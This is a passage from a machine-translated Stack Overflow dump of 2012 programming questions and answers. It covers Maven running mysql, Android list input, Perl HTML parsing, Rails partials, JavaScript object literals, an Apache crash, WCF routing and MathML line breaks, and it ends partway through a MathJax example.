                    <goals>
                        <goal>dump-db</goal>
                    </goals>
                    <inherited>false</inherited>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>

<profiles>
    <profile>
        <id>build</id>
        <build>
            <plugins>
                <plugin>
                    <groupId>my.maven.plugin</groupId>
                    <artifactId>db-dumps-maven-plugin</artifactId>

                    <executions>
                        <execution>
                            <id>create-database</id>
                            <phase>initialize</phase>
                            <goals>
                                <goal>create-db</goal>
                            </goals>
                            <inherited>false</inherited>
                        </execution>
                    </executions>
                </plugin>
            </plugins>
        </build>
    </profile>
</profiles> 
```

以及来自 db-dumps-maven-plugin 的执行片段：

```
@Override
public void execute() throws MojoExecutionException {

    final Set<String> dumpsToInsertLowerCase = evaluateDumpsToInsert();

    final List<File> sqlFiles = findFiles(folderWithDumps, ".sql", dumpsToInsertLowerCase);
    getLog().info("Inserting dumps: " + sqlFiles);

    for (final File sqlFile : sqlFiles) {
        String createCommand = "mysql -u%s --password=%s -h%s --quick --max_allowed_packet=16M --default-character-set=utf8 -e \"source %s\"";
        Object[] createArgs = {username, password, hostname, sqlFile.getAbsolutePath().replace("\\", "/")};
        executeCommand(createCommand, createArgs);
    }
}

public void executeCommand(final String command, final Object[] arguments) {

    final String commandToExecute = String.format(command, arguments);
    mavenPlugin.getLog().debug("Command to execute: " + commandToExecute);

    try {
        final Process child = Runtime.getRuntime().exec(commandToExecute);

        final InputStream inputStream = child.getInputStream();
        readAndCloseStream(inputStream, false);

        final InputStream errorStream = child.getErrorStream();
        readAndCloseStream(errorStream, true);

        // prevent leaking file descriptors, close stream
        try {
            child.getOutputStream().close();
        } catch (final IOException ioe) {
            mavenPlugin.getLog().warn("Unable to close stream. " + ioe);
        }

        // check return value
        // 0 means a normal program termination
        final int exitValue = child.exitValue();
        if (exitValue != 0) {
            throw new RuntimeException("Executing command failed. Exit code: " + exitValue);
        }

    } catch (final IOException e) {
        throw new RuntimeException(e);
    }
} 
```

知道为什么会发生这种情况，以及如何让 Maven 正确解释源命令吗？

# android - 用于在表单中**输入**字符串列表的 Android UI 视图

> ID：13916141
> 
> 赞同：0
> 
> 时间：2012-12-17T14:35:56.603
> 
> 标签：android

哪个 Android UI 组件允许在表单中输入字符串列表？

例子：

活动“食谱”允许用户将食谱发布到数据库服务器。该活动具有以下 2 个字段：

*   文本字段：配方“标题”

*   字符串字段列表：“成分”

* * *

提交示例：

标题：披萨

配料：

*   奶酪

*   番茄酱

*   意大利辣香肠

* * *

我希望用户能够输入“mozzarella”，看到“mozzarella”出现在成分列表中，并且仍然能够添加成分以完成食谱（例如添加“番茄酱”，添加“意大利辣香肠” , 全部作为表格的一部分）

* * *

注意：“Transcript”API 示例演示看起来与此“相似”......但颠倒了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T14:38:51.603

`EditText`支持多行。使用您的或类似的方式收听更改`TextWatcher`并将每条线爆炸。`SimpleAdapter`

```
EditText editText = (EditText) findViewByID(R.id.editText);
String[] ingredients = editText.getText.toString().split("\n");

SimpleAdapter adapter = new SimpleAdapter(..., ingredients, ....); 
```

# python - Python - 删除包含实际 Python 脚本的目录

> ID：13916145
> 
> 赞同：-4
> 
> 时间：2012-12-17T14:36:04.313
> 
> 标签：python, file, directory

如何删除包含已执行 python 文件的目录？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T14:51:00.790

没有程序可以在它仍在运行时删除自身或它所在的文件夹。无论您使用 Python 还是 C 或任何其他语言，操作系统都会阻止这种情况发生。

你有两个选择：

*   让您的 Python 脚本将日志文件放入子目录中，并在脚本运行结束时将其删除（当然，当用户 Ctrl-Cs 退出脚本时会失败。
*   在第一个脚本之后运行另一个脚本（在不同的目录中），删除第一个脚本的目录。当然，再一次，你不能安全地防止用户干预。当然，最后你会留下第二个脚本......

为什么您的程序无论如何都将密码存储在运行它的系统的硬盘上？

# printing - 在 Firefox 中打印 maichimp 时隐藏 div

> ID：13916152
> 
> 赞同：1
> 
> 时间：2012-12-17T14:36:23.780
> 
> 标签：printing, stylesheet, mailchimp

我们使用 mailchimp 服务为客户制作时事通讯，现在我们的客户想要打印邮件的 web 版本，但没有 mailchimp 顶部栏 (#awesomebar)。是否有插件或用于 Firefox 或 chrome 的东西可以防止 div 打印并且易于非技术人员使用？所以萤火虫不是一种选择。

我已经尝试联系 mailchimp，但他们不会更改打印 css。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-18T21:37:39.540

为什么不首先禁用 awesomebar？

如果没有，只需在模板中使用一些自定义 CSS。将该类添加`noprint`到他们不想打印的任何元素中，然后在您的自定义 CSS 中添加以下内容：

```
<style type="text/css" media="print">

.noPrint, #awesomebar {
     display:none !important;
}

</style> 
```

如果这不能“完全”为您工作，希望您可以将其作为起点。该`media="print"`标签仅在浏览器开始打印时应用——它不会影响页面的正常显示。

# perl - Perl：如何将下拉转换为哈希？

> ID：13916158
> 
> 赞同：0
> 
> 时间：2012-12-17T14:36:37.277
> 
> 标签：perl, hash

我通常将哈希转换为下拉。然而这一次，我想做相反的事情。有谁知道如何使用正则表达式来做到这一点？或任何其他方式。请注意，下拉菜单包含 optgroup 和选项。我只想要这个选项，这样 id 就是哈希的键，下拉的值就是哈希的值。

例如，如果我们有如下下拉：

```
<select>
<optgroup label=fruits>
<option id=1>Apple</option>
<option id=2>Orange</option>
<option id=3>Pineapple</option>
<optgroup label=stuff>
<option id=4>Chair</option>
<option id=5>Board</option>
</select> 
```

我希望它是

```
1=> "apple", 2=>"Orange",3=>"Pineapple",4=>"Chair", 5=>"Board" 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T23:16:15.497

您没有解释`select`元素的来源，但我认为它是完整 HTML 文档的一部分？

最好使用 来完成此操作 [`HTML::TreeBuilder`](https://metacpan.org/module/HTML%3a%3aTreeBuilder)，它将构建 HTML 页面的树结构并允许您在其中导航。

这个程序所做的就是找到页面`option`中第一条语句的所有后代，并使用属性和文本值作为每对的键和值来`select`构建散列。`id`

我`Data::Dump`只用来演示最终散列的内容。

```
use strict;
use warnings;

use HTML::TreeBuilder;

my $tree = HTML::TreeBuilder->new_from_content(<<'END');

<select>
<optgroup label=fruits>
<option id=1>Apple</option>
<option id=2>Orange</option>
<option id=3>Pineapple</option>
<optgroup label=stuff>
<option id=4>Chair</option>
<option id=5>Board</option>
</select>

END

my $select = $tree->look_down(_tag => 'select');

my %data = map { $_->id => $_->as_trimmed_text } $select->look_down(_tag => 'option');

use Data::Dump;
dd \%data; 
```

**输出**

```
{ 1 => "Apple", 2 => "Orange", 3 => "Pineapple", 4 => "Chair", 5 => "Board" } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T14:58:42.833

我建议您注意 Ben Jackson 关于使用正则表达式解析 HTML 的警告。

但是，有时您需要一个快速而肮脏的解决方案。你可以这样做：

```
use warnings;
use strict;

my %options;
while (<DATA>)
{
    if (/^<option\s+id=(\d+)>([\w\s]+)/)
    {
        $options{$1} = $2;  
    }   
}

print "$_: $options{$_}\n" for (keys %options);

__DATA__
<select>
<optgroup label=fruits>
<option id=1>Apple</option>
<option id=2>Orange</option>
<option id=3>Pineapple</option>
<optgroup label=stuff>
<option id=4>Chair</option>
<option id=5>Board</option>
</select> 
```

这做出了各种假设，例如：选项标签中永远不会有其他属性，它总是在行首，选项 id 对整个文件是唯一的，等等。

如果您的输入是完全可预测的，以便您可以做出这样的假设，那么这应该可以正常工作。但是，如果您需要“通用”解决方案，请不要使用正则表达式。

# javascript - 如何将 param['id'] 传递到索引页面

> ID：13916168
> 
> 赞同：0
> 
> 时间：2012-12-17T14:37:25.767
> 
> 标签：javascript, jquery, ruby-on-rails-3, activerecord, actionview

单击用户时，我试图在索引页面上呈现用户详细信息。

我在索引页面中有用户列表，例如

```
<% @users.each do |user| %>
   <%= link_to user.name, '', {:id => user.id, :name => 'user', :remote => true}
<% end %> 
```

在我的 javascript

```
$('#mydiv').html("<%= escape_javascript(render(:partial => '/users/show', :locals => {:id => #{params['id']}})) %>" 
```

但我无法呈现用户详细信息，因为参数 'id' 没有传递到此页面。

单击用户时如何获取此参数并在索引页面中呈现部分。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T14:46:44.027

在这种情况下，您应该稍微检查一下您的代码。您应该直接在链接中调用 show 方法并编辑控制器以使其响应 JavaScript：

查看代码：

```
<%= link_to user.name, user_path(user), remote: true %> 
```

控制器代码：

```
def show
    @user = User.find(params[:id])
    respond_to do |format|
        format.html
        format.js
    end
end 
```

并创建一个名为**users/show.js.erb的新视图**

```
$("#mydiv").html("<%= escape_javascript(render(:partial => '/users/user_show', :locals => {:user => @user})) %>"); 
```

此视图调用局部视图，您可以在其中呈现所有用户数据。此视图称为**users/_user_show.html.erb**

```
<div class="myuser">
    <%= user.name %>
</div> 
```

希望有帮助

# javascript - JavaScript 语法为空 {}

> ID：13916169
> 
> 赞同：3
> 
> 时间：2012-12-17T14:37:27.790
> 
> 标签：javascript, function, literals

我试图弄清楚空是什么`{}`意思。

```
var $sb = $sb || {}; 
```

这是否意味着变量 $sb 的值要么被复制到自身，要么是一个函数文字？

完整的上下文：

```
var $sb = $sb || {};
$sb.xxx = function() {
    // code
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-17T14:39:01.103

这是快捷方式

```
new Object() 
```

所以这条线

```
var $sb = $sb || {}; 
```

将检查变量是否`$sb`存在，如果不存在则创建新对象并将其分配给`$sb`变量。

所以用其他方式你可以这样写：

```
if( !$sb ) {
    var $sb = new Object();
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-17T14:46:58.090

`var a = {}`称为对象字面量表示法。它比它更快，`var a = new Object()`因为它不需要范围解析（即您可以定义一个具有相同名称的构造函数，因此 JavaScript 引擎必须进行这样的查找）。

该模式`var a = a || {};`用于避免`a`在您已经定义的情况下进行替换`a`。在此模式中，或运算符：`||`用作合并运算符。if `a`is `null`or`undefined`它将执行语句右侧的表达式：`{}`

使用此模式可确保您`a`始终将其定义为，`object`并且如果它已经存在，则不会被覆盖。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-17T14:40:13.730

这是一个对象字面量。像：

```
var obj = { x: 4, y: 2 }; 
```

只有没有属性：

```
var obj = {}; 
```

如果计算结果`||`为非假值，则运算符返回第一个操作数，否则返回第二个操作数。所以表达式`$sb || {};`返回`$sb`如果它存在的值，否则它创建一个新的空对象。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-17T14:38:51.783

它是的缩写`new Object()`

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-17T14:40:58.123

它的简称：

```
new Object() 
```

在这种情况下，这意味着`$sb`将设置为它自己的值，或者设置为一个新的、空的对象，以防`$sb`是`undefined`。

# php - Apache 崩溃并出现错误 R6016 not enough space for thread data

> ID：13916171
> 
> 赞同：1
> 
> 时间：2012-12-17T14:37:38.307
> 
> 标签：php, c++, apache, apache2

我的应用程序正常工作，但在某些情况下我收到此错误

```
R6016 not enough space for thread data 
```

所以我现在正在调查为什么会出现这个错误。如果我的应用程序在后端引起了这个或什么，我不确定。

这是来自错误的 Windows 事件日志的 xml

```
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Application Error" /> 
  <EventID Qualifiers="0">1000</EventID> 
  <Level>2</Level> 
  <Task>100</Task> 
  <Keywords>0x80000000000000</Keywords> 
  <TimeCreated SystemTime="2012-12-17T14:03:36.000000000Z" /> 
  <EventRecordID>333483</EventRecordID> 
  <Channel>Application</Channel> 
  <Computer>MY-PC</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data>apache.exe</Data> 
  <Data>2.2.19.0</Data> 
  <Data>4dd7429b</Data> 
  <Data>ntdll.dll</Data> 
  <Data>6.1.7601.17725</Data> 
  <Data>4ec49b8f</Data> 
  <Data>c0000005</Data> 
  <Data>000343d6</Data> 
  </EventData> 
```

这里还有一个帮助信息

```
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Windows Error Reporting" /> 
  <EventID Qualifiers="0">1001</EventID> 
  <Level>4</Level> 
  <Task>0</Task> 
  <Keywords>0x80000000000000</Keywords> 
  <TimeCreated SystemTime="2012-12-17T14:03:45.000000000Z" /> 
  <EventRecordID>333484</EventRecordID> 
  <Channel>Application</Channel> 
  <Computer>MY-PC</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data>3122334836</Data> 
  <Data>1</Data> 
  <Data>APPCRASH</Data> 
  <Data>Not available</Data> 
  <Data>0</Data> 
  <Data>apache.exe</Data> 
  <Data>2.2.19.0</Data> 
  <Data>4dd7429b</Data> 
  <Data>ntdll.dll</Data> 
  <Data>6.1.7601.17725</Data> 
  <Data>4ec49b8f</Data> 
  <Data>c0000005</Data> 
  <Data>000343d6</Data> 
  <Data /> 
  <Data /> 
  <Data>C:\Users\MyUserName\AppData\Local\Temp\WERA29B.tmp.WERInternalMetadata.xml</Data> 
  <Data>C:\ProgramData\Microsoft\Windows\WER\ReportArchive\AppCrash_SenseWeb.exe_337f61e2ed7abb1fe78d685bd48c832557c6b1_3561c67f</Data> 
  <Data /> 
  <Data>0</Data> 
  <Data>8c82cf18-4852-11e2-a5d0-005056c00008</Data> 
  <Data>0</Data> 
  </EventData>
  </Event> 
```

为什么会这样？我做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T14:44:00.737

有两种可能：

On 是如果您重复加载和卸载某些 DLL，导致系统用完 TLS 条目。你应该让它加载。

另一个是如果您一遍又一遍地调用[TLSAlloc](https://stackoverflow.com/a/928381/721269)。您应该只需要调用它非常少的次数。

有关更多信息，请参阅[此知识库文章](http://support.microsoft.com/kb/126709)。

# wcf - WCF 4 路由服务协议桥接问题（nettcp 公开服务）

> ID：13916174
> 
> 赞同：1
> 
> 时间：2012-12-17T14:37:46.870
> 
> 标签：wcf, iis-7.5, nettcpbinding, wcf-routing

我们遇到了 WCF 路由服务 4.0 问题。我们正在做从 http 到 net.tcp 的协议桥接，我们的 net.tcp WCF 服务托管在 AppFabric 1.1 内的 IIS 7.5 中。此问题发生在 Windows 7 开发盒和 Windows 2008 R2 服务器上。问题是，在 IIS ApplicationPool 回收或 ApplicationPool 停止路由服务上的 System.ObjectDisposedException 之后，在下一次调用路由服务时，它将抛出 System.ServiceModel.ProtocolException：此通道不能再用于发送消息为由于服务器启动的关闭，输出会话自动关闭。通过将 DispatchRuntime.AutomaticInputSessionShutdown 设置为 false 来禁用自动关闭，或者考虑使用远程服务器修改关闭协议。

此时，无法通过路由服务进行所有进一步的调用。奇怪的是，如果通过 net.tcp 公开的 WCF 服务是自托管的，则不会出现此问题。因此，如果您关闭托管 WCF 服务的控制台主机，然后再次打开它，路由服务将再次运行。在通过 net.tcp 绑定公开的 IIS 托管 WCF 服务的情况下，此恢复缺失。

为了重现此问题，我们从[http://msdn.microsoft.com/en-us/vs2010trainingcourse_whatsnewinwcf4_topic17.aspx](http://msdn.microsoft.com/en-us/vs2010trainingcourse_whatsnewinwcf4_topic17.aspx)获取了 Ex8-ProtocolBridging 解决方案，并添加了一个 IIS 托管版本的 CalculatorService，称为 CalculatorServiceIis。

我将解决方案文件和 Word 文件“DescribedIssue.docx”下载到[https://rapidshare.com/files/3527502127/ProtocolBridgingIssue.zip](https://rapidshare.com/files/3527502127/ProtocolBridgingIssue.zip)。您可以在那里找到如何重现该问题的完整描述。

# line-breaks - 如何在 MathML 中换行？

> ID：13916177
> 
> 赞同：6
> 
> 时间：2012-12-17T14:38:01.257
> 
> 标签：line-breaks, mathml

我正在一个网站上解决一些具有编程功能外观的练习，所以我需要写多行，但我不知道如何制作，因为它以一个单一的方式显示所有内容，也许一些 CSS 会做了？任何帮助都会非常感激，在此先感谢:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2016-04-19T06:38:48.667

要创建这样的换行符，您只需要以下内容。

```
<mspace linebreak='newline' /> 
```

如果您更愿意向渲染引擎提供提示并让它自行换行，您可以为 linebreak 属性使用以下值：

```
值 描述
nobreak 禁止在此位置换行。
badbreak 尝试防止在此位置出现换行符。
goodbreak 建议在此位置换行。

```

`<mo>`由于换行符经常出现在运算符处，MathML 也允许您在元素上使用所有这些属性。但是，由于您现在要在可见符号上中断，因此您需要 linebreakstyle 属性来指定换行符是应该在运算符之前、在运算符之后，还是应该重复运算符并出现在两行上。有效值是（分别）：之前、之后和重复。

因此，`<mspace/>`您可以直接在该行的最后一个运算符上指定它，而不是像前面的示例中那样使用：

```
<mo linebreak='newline' linebreakstyle='after'>+</mo> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-03-01T19:35:46.953

[https://bugzilla.mozilla.org/show_bug.cgi?id=534962](https://bugzilla.mozilla.org/show_bug.cgi?id=534962) states that this still is work in progress for Firefox. Also see [https://bugzilla.mozilla.org/show_bug.cgi?id=380266](https://bugzilla.mozilla.org/show_bug.cgi?id=380266) for another thing that currently isn't implemented => There currently may be no way to add linebreaks other than using mtable tags in order to add hard linebreaks.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-01-20T08:42:57.197

两个答案 [ [1](https://stackoverflow.com/a/35731856/9215209) , [2](https://stackoverflow.com/a/36710400/9215209) ] 都是正确的。虽然 MathML 定义了[换行的](https://www.w3.org/TR/MathML3/chapter3.html#presm.linebreaking)工作方式，但 Firefox 目前还没有实现它。

目前你最好的选择是使用[MathJax](http://docs.mathjax.org/en/latest/output.html#automatic-line-breaking)。因此，如果您使用 MathJax 来“渲染”MathML，那么换行应该可以工作。查看下面的示例 [ [3](http://dlmf.nist.gov/25.11#E28) ]，了解如何配置 MathJax 来处理换行。

```
<html>

<head>
  <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML">
  </script>
  <script type="text/x-mathjax-config">
    MathJax.Hub.Config({ CommonHTML: { linebreaks: { automatic: true } }, "HTML-CSS": { linebreaks: { automatic: true } }, SVG: { linebreaks: { automatic: true } } });
  </script>
</head>

<body>
  <math xmlns="http://www.w3.org/1998/Math/MathML" id="p1.1.m1.1" class="ltx_Math" alttext="{\displaystyle{\displaystyle{\displaystyle\HurwitzZeta@{s}{a}=\frac{1}{2}a^{-s%
}+\frac{a^{1-s}}{s-1}+\sum_{k=1}^{n}\frac{\EulerGamma@{s+2k-1}}{\EulerGamma@{s%
}}\frac{\BernoulliB{2k}}{(2k)!}a^{-2k-s+1}+\frac{1}{\EulerGamma@{s}}\int_{0}^{%
\infty}\left(\frac{1}{e^{x}-1}-\frac{1}{x}+\frac{1}{2}-\sum_{k=1}^{n}\frac{%
\BernoulliB{2k}}{(2k)!}x^{2k-1}\right)x^{s-1}e^{-ax}\diff{x}}}}">
  <semantics id="p1.1.m1.1a">
    <mrow id="p1.1.m1.1.40" xref="p1.1.m1.1.40.cmml">
      <mrow id="p1.1.m1.1.1.10.2" xref="p1.1.m1.1.1.1.cmml">
        <mpadded width="-1.7pt" id="p1.1.m1.1.1.2" xref="p1.1.m1.1.1.1.cmml">
          <mi id="p1.1.m1.1.1.2.1.2" xref="p1.1.m1.1.1.2.1.1.cmml">ζ</mi>
        </mpadded>
        <mo id="p1.1.m1.1.1.10.2a" xref="p1.1.m1.1.1.1.cmml">⁡&lt;/mo>
        <mrow id="p1.1.m1.1.1.10.2.1" xref="p1.1.m1.1.1.1.cmml">
          <mo id="p1.1.m1.1.1.5" xref="p1.1.m1.1.1.1.cmml">(</mo>
          <mi id="p1.1.m1.1.1.6" xref="p1.1.m1.1.1.6.cmml">s</mi>
          <mo id="p1.1.m1.1.1.7" xref="p1.1.m1.1.1.1.cmml">,</mo>
          <mi id="p1.1.m1.1.1.8" xref="p1.1.m1.1.1.8.cmml">a</mi>
          <mo id="p1.1.m1.1.1.9" xref="p1.1.m1.1.1.1.cmml">)</mo>
        </mrow>
      </mrow>
      <mo id="p1.1.m1.1.2" xref="p1.1.m1.1.2.cmml">=</mo>
      <mrow id="p1.1.m1.1.40.1" xref="p1.1.m1.1.40.1.cmml">
        <mrow id="p1.1.m1.1.40.1.1" xref="p1.1.m1.1.40.1.1.cmml">
          <mstyle displaystyle="true" id="p1.1.m1.1.3" xref="p1.1.m1.1.3.cmml">
            <mfrac id="p1.1.m1.1.3a" xref="p1.1.m1.1.3.cmml">
              <mn id="p1.1.m1.1.3.2" xref="p1.1.m1.1.3.2.cmml">1</mn>
              <mn id="p1.1.m1.1.3.3" xref="p1.1.m1.1.3.3.cmml">2</mn>
            </mfrac>
          </mstyle>
          <mo id="p1.1.m1.1.40.1.1.1" xref="p1.1.m1.1.40.1.1.1.cmml">⁢&lt;/mo>
          <msup id="p1.1.m1.1.40.1.1.2" xref="p1.1.m1.1.40.1.1.2.cmml">
            <mi id="p1.1.m1.1.4" xref="p1.1.m1.1.4.cmml">a</mi>
            <mrow id="p1.1.m1.1.5.1" xref="p1.1.m1.1.5.1.cmml">
              <mo id="p1.1.m1.1.5.1.1" xref="p1.1.m1.1.5.1.1.cmml">-</mo>
              <mi id="p1.1.m1.1.5.1.2" xref="p1.1.m1.1.5.1.2.cmml">s</mi>
            </mrow>
          </msup>
        </mrow>
        <mo id="p1.1.m1.1.6" xref="p1.1.m1.1.6.cmml">+</mo>
        <mstyle displaystyle="true" id="p1.1.m1.1.7" xref="p1.1.m1.1.7.cmml">
          <mfrac id="p1.1.m1.1.7a" xref="p1.1.m1.1.7.cmml">
            <msup id="p1.1.m1.1.7.2" xref="p1.1.m1.1.7.2.cmml">
              <mi id="p1.1.m1.1.7.2.1" xref="p1.1.m1.1.7.2.1.cmml">a</mi>
              <mrow id="p1.1.m1.1.7.2.2.1" xref="p1.1.m1.1.7.2.2.1.cmml">
                <mn id="p1.1.m1.1.7.2.2.1.1" xref="p1.1.m1.1.7.2.2.1.1.cmml">1</mn>
                <mo id="p1.1.m1.1.7.2.2.1.2" xref="p1.1.m1.1.7.2.2.1.2.cmml">-</mo>
                <mi id="p1.1.m1.1.7.2.2.1.3" xref="p1.1.m1.1.7.2.2.1.3.cmml">s</mi>
              </mrow>
            </msup>
            <mrow id="p1.1.m1.1.7.3" xref="p1.1.m1.1.7.3.cmml">
              <mi id="p1.1.m1.1.7.3.1" xref="p1.1.m1.1.7.3.1.cmml">s</mi>
              <mo id="p1.1.m1.1.7.3.2" xref="p1.1.m1.1.7.3.2.cmml">-</mo>
              <mn id="p1.1.m1.1.7.3.3" xref="p1.1.m1.1.7.3.3.cmml">1</mn>
            </mrow>
          </mfrac>
        </mstyle>
        <mo id="p1.1.m1.1.6a" xref="p1.1.m1.1.6.cmml">+</mo>
        <mrow id="p1.1.m1.1.40.1.2" xref="p1.1.m1.1.40.1.2.cmml">
          <mstyle displaystyle="true" id="p1.1.m1.1.40.1.2.1" xref="p1.1.m1.1.40.1.2.1.cmml">
            <munderover id="p1.1.m1.1.40.1.2.1a" xref="p1.1.m1.1.40.1.2.1.cmml">
              <mo largeop="true" movablelimits="false" symmetric="true" id="p1.1.m1.1.9" xref="p1.1.m1.1.9.cmml">∑&lt;/mo>
              <mrow id="p1.1.m1.1.10.1" xref="p1.1.m1.1.10.1.cmml">
                <mi id="p1.1.m1.1.10.1.1" xref="p1.1.m1.1.10.1.1.cmml">k</mi>
                <mo id="p1.1.m1.1.10.1.2" xref="p1.1.m1.1.10.1.2.cmml">=</mo>
                <mn id="p1.1.m1.1.10.1.3" xref="p1.1.m1.1.10.1.3.cmml">1</mn>
              </mrow>
              <mi id="p1.1.m1.1.11.1" xref="p1.1.m1.1.11.1.cmml">n</mi>
            </munderover>
          </mstyle>
          <mrow id="p1.1.m1.1.40.1.2.2" xref="p1.1.m1.1.40.1.2.2.cmml">
            <mstyle displaystyle="true" id="p1.1.m1.1.12" xref="p1.1.m1.1.12.cmml">
              <mfrac id="p1.1.m1.1.12a" xref="p1.1.m1.1.12.cmml">
                <mrow id="p1.1.m1.1.12.2.1.8.2" xref="p1.1.m1.1.12.2.1.1.cmml">
                  <mpadded width="-1.7pt" id="p1.1.m1.1.12.2.1.2" xref="p1.1.m1.1.12.2.1.1.cmml">
                    <mi mathvariant="normal" id="p1.1.m1.1.12.2.1.2.1.2" xref="p1.1.m1.1.12.2.1.2.1.1.cmml">Γ</mi>
                  </mpadded>
                  <mo id="p1.1.m1.1.12.2.1.8.2a" xref="p1.1.m1.1.12.2.1.1.cmml">⁡&lt;/mo>
                  <mrow id="p1.1.m1.1.12.2.1.8.2.1" xref="p1.1.m1.1.12.2.1.1.cmml">
                    <mo id="p1.1.m1.1.12.2.1.5" xref="p1.1.m1.1.12.2.1.1.cmml">(</mo>
                    <mrow id="p1.1.m1.1.12.2.1.6" xref="p1.1.m1.1.12.2.1.6.cmml">
                      <mrow id="p1.1.m1.1.12.2.1.6.7" xref="p1.1.m1.1.12.2.1.6.7.cmml">
                        <mi id="p1.1.m1.1.12.2.1.6.1" xref="p1.1.m1.1.12.2.1.6.1.cmml">s</mi>
                        <mo id="p1.1.m1.1.12.2.1.6.2" xref="p1.1.m1.1.12.2.1.6.2.cmml">+</mo>
                        <mrow id="p1.1.m1.1.12.2.1.6.7.1" xref="p1.1.m1.1.12.2.1.6.7.1.cmml">
                          <mn id="p1.1.m1.1.12.2.1.6.3" xref="p1.1.m1.1.12.2.1.6.3.cmml">2</mn>
                          <mo id="p1.1.m1.1.12.2.1.6.7.1.1" xref="p1.1.m1.1.12.2.1.6.7.1.1.cmml">⁢&lt;/mo>
                          <mi id="p1.1.m1.1.12.2.1.6.4" xref="p1.1.m1.1.12.2.1.6.4.cmml">k</mi>
                        </mrow>
                      </mrow>
                      <mo id="p1.1.m1.1.12.2.1.6.5" xref="p1.1.m1.1.12.2.1.6.5.cmml">-</mo>
                      <mn id="p1.1.m1.1.12.2.1.6.6" xref="p1.1.m1.1.12.2.1.6.6.cmml">1</mn>
                    </mrow>
                    <mo id="p1.1.m1.1.12.2.1.7" xref="p1.1.m1.1.12.2.1.1.cmml">)</mo>
                  </mrow>
                </mrow>
                <mrow id="p1.1.m1.1.12.3.1.8.2" xref="p1.1.m1.1.12.3.1.1.cmml">
                  <mpadded width="-1.7pt" id="p1.1.m1.1.12.3.1.2" xref="p1.1.m1.1.12.3.1.1.cmml">
                    <mi mathvariant="normal" id="p1.1.m1.1.12.3.1.2.1.2" xref="p1.1.m1.1.12.3.1.2.1.1.cmml">Γ</mi>
                  </mpadded>
                  <mo id="p1.1.m1.1.12.3.1.8.2a" xref="p1.1.m1.1.12.3.1.1.cmml">⁡&lt;/mo>
                  <mrow id="p1.1.m1.1.12.3.1.8.2.1" xref="p1.1.m1.1.12.3.1.1.cmml">
                    <mo id="p1.1.m1.1.12.3.1.5" xref="p1.1.m1.1.12.3.1.1.cmml">(</mo>
                    <mi id="p1.1.m1.1.12.3.1.6" xref="p1.1.m1.1.12.3.1.6.cmml">s</mi>
                    <mo id="p1.1.m1.1.12.3.1.7" xref="p1.1.m1.1.12.3.1.1.cmml">)</mo>
                  </mrow>
                </mrow>
              </mfrac>
            </mstyle>
            <mo id="p1.1.m1.1.40.1.2.2.1" xref="p1.1.m1.1.40.1.2.2.1.cmml">⁢&lt;/mo>
            <mstyle displaystyle="true" id="p1.1.m1.1.13" xref="p1.1.m1.1.13.cmml">
              <mfrac id="p1.1.m1.1.13a" xref="p1.1.m1.1.13.cmml">
                <msub id="p1.1.m1.1.13.2.1.5" xref="p1.1.m1.1.13.2.1.1.cmml">
                  <mi id="p1.1.m1.1.13.2.1.2" xref="p1.1.m1.1.13.2.1.1.1.cmml">B</mi>
                  <mrow id="p1.1.m1.1.13.2.1.3.1" xref="p1.1.m1.1.13.2.1.3.1.cmml">
                    <mn id="p1.1.m1.1.13.2.1.3.1.1.1" xref="p1.1.m1.1.13.2.1.3.1.1.1.cmml">2</mn>
                    <mo id="p1.1.m1.1.13.2.1.3.1.1.3" xref="p1.1.m1.1.13.2.1.3.1.1.3.cmml">⁢&lt;/mo>
                    <mi id="p1.1.m1.1.13.2.1.3.1.1.2" xref="p1.1.m1.1.13.2.1.3.1.1.2.cmml">k</mi>
                  </mrow>
                </msub>
                <mrow id="p1.1.m1.1.13.3" xref="p1.1.m1.1.13.3.cmml">
                  <mrow id="p1.1.m1.1.13.3.6" xref="p1.1.m1.1.13.3.6.2.cmml">
                    <mo stretchy="false" id="p1.1.m1.1.13.3.1" xref="p1.1.m1.1.13.3.6.2.cmml">(</mo>
                    <mrow id="p1.1.m1.1.13.3.6.2" xref="p1.1.m1.1.13.3.6.2.cmml">
                      <mn id="p1.1.m1.1.13.3.2" xref="p1.1.m1.1.13.3.2.cmml">2</mn>
                      <mo id="p1.1.m1.1.13.3.6.2.1" xref="p1.1.m1.1.13.3.6.2.1.cmml">⁢&lt;/mo>
                      <mi id="p1.1.m1.1.13.3.3" xref="p1.1.m1.1.13.3.3.cmml">k</mi>
                    </mrow>
                    <mo stretchy="false" id="p1.1.m1.1.13.3.4" xref="p1.1.m1.1.13.3.6.2.cmml">)</mo>
                  </mrow>
                  <mo lspace="0pt" rspace="3.5pt" id="p1.1.m1.1.13.3.5" xref="p1.1.m1.1.13.3.5.cmml">!</mo>
                </mrow>
              </mfrac>
            </mstyle>
            <mo id="p1.1.m1.1.40.1.2.2.1a" xref="p1.1.m1.1.40.1.2.2.1.cmml">⁢&lt;/mo>
            <msup id="p1.1.m1.1.40.1.2.2.2" xref="p1.1.m1.1.40.1.2.2.2.cmml">
              <mi id="p1.1.m1.1.14" xref="p1.1.m1.1.14.cmml">a</mi>
              <mrow id="p1.1.m1.1.15.1" xref="p1.1.m1.1.15.1.cmml">
